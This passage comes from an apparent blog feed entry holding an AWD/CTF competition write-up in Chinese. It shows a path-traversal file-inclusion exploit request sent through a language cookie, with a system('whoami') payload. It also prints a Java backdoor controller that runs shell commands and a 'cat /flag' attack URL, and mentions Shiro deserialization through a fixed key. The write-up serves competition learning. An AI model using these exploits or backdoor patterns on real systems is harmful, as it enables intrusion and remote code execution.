class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$folderPath</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Exception</span>(<span class="hljs-string">&#x27;Unable to extract the file&#x27;</span>);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileDir</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现虽然报错了，但是依然会解压到addons目录下</p><p><img src="/img/awd/ccb-cms-5.png"></p><p>但是无法访问到，这里需要用到文件上传+文件包含组合拳进行利用</p><p>&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Ajax.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> \think\response\Jsonp</span><br><span class="hljs-comment"> * 自动加载语言函数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lang</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/javascript&#x27;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;controllername&quot;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">parse_name</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>));<br>    <span class="hljs-variable">$app</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;app&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonp</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadlang</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$app</span>))-&gt;<span class="hljs-title function_ invoke__">code</span>(<span class="hljs-number">200</span>)-&gt;<span class="hljs-title function_ invoke__">options</span>([<br>        <span class="hljs-string">&#x27;var_jsonp_handler&#x27;</span> =&gt; <span class="hljs-string">&#x27;callback&#x27;</span>,<br>        <span class="hljs-string">&#x27;default_jsonp_handler&#x27;</span> =&gt; <span class="hljs-string">&#x27;jsonpReturn&#x27;</span>,<br>        <span class="hljs-string">&#x27;json_encode_param&#x27;</span> =&gt; JSON_PRETTY_PRINT | JSON_FORCE_OBJECT |JSON_UNESCAPED_UNICODE,<br>    ])-&gt;<span class="hljs-title function_ invoke__">allowCache</span>(<span class="hljs-literal">true</span>)-&gt;<span class="hljs-title function_ invoke__">expires</span>(<span class="hljs-number">7200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进loadlang方法</p><p>&#x2F;app&#x2F;common&#x2F;controller&#x2F;Backend.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadlang</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$app</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">cookie</span>(<span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;lang.cookie_var&#x27;</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$app</span> &amp;&amp; <span class="hljs-variable">$app</span>!==<span class="hljs-string">&#x27;backend&#x27;</span>)&#123;<br>        <span class="hljs-variable">$res</span> =  <span class="hljs-title class_">Lang</span>::<span class="hljs-title function_ invoke__">load</span>([<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-string">&#x27;backend&#x27;</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-variable">$app</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span>  . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getBasePath</span>() .<span class="hljs-variable">$app</span>. DS . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . DS . <span class="hljs-title function_ invoke__">str_replac</span>(<span class="hljs-string">&#x27;.&#x27;</span>, DS, <span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>        ]);<br>   &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title class_">Lang</span>::<span class="hljs-title function_ invoke__">load</span>([<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>            <span class="hljs-variable">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;lang&#x27;</span> . DS . <span class="hljs-variable">$lang</span> . DS . <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;.&#x27;</span>, DS,<span class="hljs-variable">$name</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>,<br>        ]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显，从 lang.cookie_var 配置中获取一个cookie值并进行文件包含</p><p>查看cookie_var的名字</p><p>&#x2F;config&#x2F;lang.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// 默认语言</span><br>    <span class="hljs-string">&#x27;default_lang&#x27;</span>    =&gt; <span class="hljs-title class_">Env</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;lang.default_lang&#x27;</span>, <span class="hljs-string">&#x27;zh-cn&#x27;</span>),<br>    <span class="hljs-comment">// 允许的语言列表</span><br>    <span class="hljs-string">&#x27;allow_lang_list&#x27;</span> =&gt; [<span class="hljs-string">&#x27;zh-cn&#x27;</span>,<span class="hljs-string">&#x27;en-us&#x27;</span>],<br>    <span class="hljs-comment">// 多语言自动侦测变量名 / 自动侦测的GET变量名</span><br>    <span class="hljs-string">&#x27;detect_var&#x27;</span>      =&gt; <span class="hljs-string">&#x27;lang&#x27;</span>,<br>    <span class="hljs-comment">// 是否使用Cookie记录</span><br>    <span class="hljs-string">&#x27;use_cookie&#x27;</span>      =&gt; <span class="hljs-literal">true</span>,<br>    <span class="hljs-comment">// 多语言cookie变量</span><br>    <span class="hljs-string">&#x27;cookie_var&#x27;</span>      =&gt; <span class="hljs-string">&#x27;think_lang&#x27;</span>,<br>    <span class="hljs-comment">// 扩展语言包</span><br>    <span class="hljs-string">&#x27;extend_list&#x27;</span>     =&gt; [],<br>    <span class="hljs-comment">// Accept-Language转义为对应语言包名称</span><br>    <span class="hljs-string">&#x27;accept_language&#x27;</span> =&gt; [<br>        <span class="hljs-string">&#x27;zh-hans-cn&#x27;</span> =&gt; <span class="hljs-string">&#x27;zh-cn&#x27;</span>,<br>    ],<br>    <span class="hljs-comment">// 是否支持语言分组</span><br>    <span class="hljs-string">&#x27;allow_group&#x27;</span>     =&gt; <span class="hljs-literal">true</span>,<br>];<br></code></pre></td></tr></table></figure><p>因为是全局变量，所以任何地方都可以调用</p><p>包含的时候注意后缀 .php 已经存在了，不需要再写</p><p><img src="/img/awd/ccb-cms-4.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">POST / HTTP/1.1<br>Host: 0dbaba9b-169b-4afb-ab9d-71f60e228260.ctfd.lewiserii.top:8080<br>Cookie: think_lang=/../../../addons/shell;<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 19<br><br>a=system(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure><p><strong>修复</strong></p><p>对 $lang 进行过滤即可</p><h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞1-默认后门"><a href="#漏洞1-默认后门" class="headerlink" title="漏洞1-默认后门"></a>漏洞1-默认后门</h2><p>存在默认后门</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.doctoolkit.controller.test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">backdoor</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (command != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osType</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osType != <span class="hljs-literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, command&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmds).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len);<br>            <span class="hljs-keyword">return</span> output;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><p><code>/test/backd0or?cmd=cat /flag</code></p><p><img src="/img/awd/ccb-DocToolkit-1.png"></p><p><strong>修复：</strong></p><p>没修复成功。。</p><h2 id="漏洞2-shiro反序列化"><a href="#漏洞2-shiro反序列化" class="headerlink" title="漏洞2-shiro反序列化"></a>漏洞2-shiro反序列化</h2><p>有shiro依赖</p><p>在shiro的配置文件中发现了固定秘钥</p><p><img src="/img/awd/ccb-DocToolkit-2.png"></p><p>直接用工具打就好了，然后抓流量进行批量</p><p><img src="/img/awd/ccb-DocToolkit-3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;rank: 6&lt;/p&gt;
&lt;h1 id=&quot;tomcat&quot;&gt;&lt;a href=&quot;#tomcat&quot; class=&quot;headerlink&quot; title=&quot;tomcat&quot;&gt;&lt;/a&gt;tomcat&lt;/h1&gt;&lt;h2 id=&quot;漏洞1-文件上传getshell&quot;&gt;&lt;a href=&quot;#漏洞1-文件</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
    <category term="长城杯" scheme="https://www.dr0n.top/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
</feed>
